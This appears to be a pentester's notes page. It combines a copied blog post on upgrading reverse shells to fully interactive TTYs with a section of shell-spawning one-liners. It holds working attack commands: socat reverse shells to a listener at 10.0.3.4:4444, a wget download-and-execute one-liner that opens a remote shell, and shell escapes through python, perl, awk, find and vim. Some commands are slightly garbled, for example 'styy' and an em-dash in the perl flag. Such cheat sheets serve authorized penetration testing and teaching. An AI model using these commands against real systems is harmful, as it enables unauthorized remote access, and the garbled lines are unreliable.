Also try penelope
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

`pty python`
```bash
# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
```

`socat`
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
``
```bash

in reverse shell:
ctrl +Z
# In Kali
	styy -a
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols> (u get this from stty -a) 
#example:
stty rows 38 columns 116

```
# 2: Using socat

If `socat` is installed on the victim server, you can launch a reverse shell with it. You _must_ catch the connection with `socat` as well to get the full functions.
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

**On Victim (launch)**:
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

If socat isn’t installed, you’re not out of luck. There are standalone binaries that can be downloaded from this awesome Github repo:

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

oneliner download and execute
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
On Kali, you’ll catch a fully interactive TTY session. It supports tab-completion, SIGINT/SIGSTP support, vim, up arrow history, etc. It’s a full terminal. Pretty sweet.

#  Method 2: from netcat with magic

I watched Phineas Fisher use this technique in his hacking video, and it feels like magic. Basically it is possible to use a dumb netcat shell to upgrade to a full TTY by setting some `stty` options within your Kali terminal.

First, follow the same technique as in Method 1 and use Python to spawn a PTY. Once bash is running in the PTY, background the shell with `Ctrl-Z`

[![Background shell](https://blog.ropnop.com/images/2017/07/background_netcat.png)](https://blog.ropnop.com/images/2017/07/background_netcat.png)

While the shell is in the background, now examine the current terminal and STTY info so we can force the connected shell to match it:
[![Term and STTY info](https://blog.ropnop.com/images/2017/07/term_stty_info.png)](https://blog.ropnop.com/images/2017/07/term_stty_info.png)

The information needed is the TERM type (_“xterm-256color”_) and the size of the current TTY (_“rows 38; columns 116”_)

With the shell still backgrounded, now set the current STTY to type raw and tell it to echo the input characters with the following command:

|   |   |
|---|---|
|```<br>1<br>```|```bash<br>stty raw -echo<br>```|

With a raw stty, input/output will look weird and you won’t see the next commands, but as you type they are being processed.

Next foreground the shell with `fg`. It will re-open the reverse shell but formatting will be off. Finally, reinitialize the terminal with `reset`.

[![Foreground and reset](https://blog.ropnop.com/images/2017/07/fg_reset.png)](https://blog.ropnop.com/images/2017/07/fg_reset.png)

_Note: I did not type the `nc` command again (as it might look above). I actually entered `fg`, but it was not echoed. The `nc` command is the job that is now in the foreground. The `reset` command was then entered into the netcat shell_

After the `reset` the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above)

|   |   |
|---|---|
|```<br>1<br>2<br>3<br>```|```bash<br>$ export SHELL=bash<br>$ export TERM=xterm256-color<br>$ stty rows 38 columns 116<br>```|

The end result is a fully interactive TTY with all the features we’d expect (tab-complete, history, job control, etc) all over a netcat connection:

[![Netcat full TTY](https://blog.ropnop.com/images/2017/07/netcat_full_tty.png)](https://blog.ropnop.com/images/2017/07/netcat_full_tty.png)

The possibilities are endless now. Tmux over a netcat shell?? Why not? :D

[![Tmux over Netcat](https://blog.ropnop.com/images/2017/07/tmux_over_netcat-1.png)](https://blog.ropnop.com/images/2017/07/tmux_over_netcat-1.png)

### tty shell
We can manually spawn a TTY shell using Python if it is present on the system. We can always check for Python's presence on Linux systems by typing the command: `which python`. To spawn the TTY shell session using Python, we type the following command:
`which python`

```shell-session
python -c 'import pty; pty.spawn("/bin/sh")' 
```

# Spawning Interactive Shells

## /bin/sh -i

This command will execute the shell interpreter specified in the path in interactive mode (`-i`).


```shell-session
/bin/sh -i
sh: no job control in this shell
sh-4.2$
```

---

## Perl

If the programming language [Perl](https://www.perl.org) is present on the system, these commands will execute the shell interpreter specified.


```shell-session
perl —e 'exec "/bin/sh";'
```



```shell-session
perl: exec "/bin/sh";
```

The command directly above should be run from a script.

---

## Ruby

If the programming language [Ruby](https://www.ruby-lang.org/en/) is present on the system, this command will execute the shell interpreter specified:



```shell-session
ruby: exec "/bin/sh"
```

The command directly above should be run from a script.

---

## Lua

If the programming language [Lua](https://www.lua.org) is present on the system, we can use the `os.execute` method to execute the shell interpreter specified using the full command below:


```shell-session
lua: os.execute('/bin/sh')
```

The command directly above should be run from a script.

---

## AWK

[AWK](https://man7.org/linux/man-pages/man1/awk.1p.html) is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. This is shown in the short awk script below:


```shell-session
awk 'BEGIN {system("/bin/sh")}'
```

---

## Find

[Find](https://man7.org/linux/man-pages/man1/find.1.html) is a command present on most Unix/Linux systems widely used to search for & through files and directories using various criteria. It can also be used to execute applications and invoke a shell interpreter.


```shell-session
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

This use of the find command is searching for any file listed after the `-name` option, then it executes `awk` (`/bin/awk`) and runs the same script we discussed in the awk section to execute a shell interpreter.

---

## Using Exec To Launch A Shell


```shell-session
find . -exec /bin/sh \; -quit
```

This use of the find command uses the execute option (`-exec`) to initiate the shell interpreter directly. If `find` can't find the specified file, then no shell will be attained.

---

## VIM

Yes, we can set the shell interpreter language from within the popular command-line-based text-editor `VIM`. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.


```shell-session
vim -c ':!/bin/sh'
```


```shell-session
vim
:set shell=/bin/sh
:shell
```

---

## Execution Permissions Considerations

In addition to knowing about all the options listed above, we should be mindful of the permissions we have with the shell session's account. We can always attempt to run this command to list the file properties and permissions our account has over any given file or binary:


```shell-session
ls -la <path/to/fileorbinary>
```

We can also attempt to run this command to check what `sudo` permissions the account we landed on has:

#### Sudo -l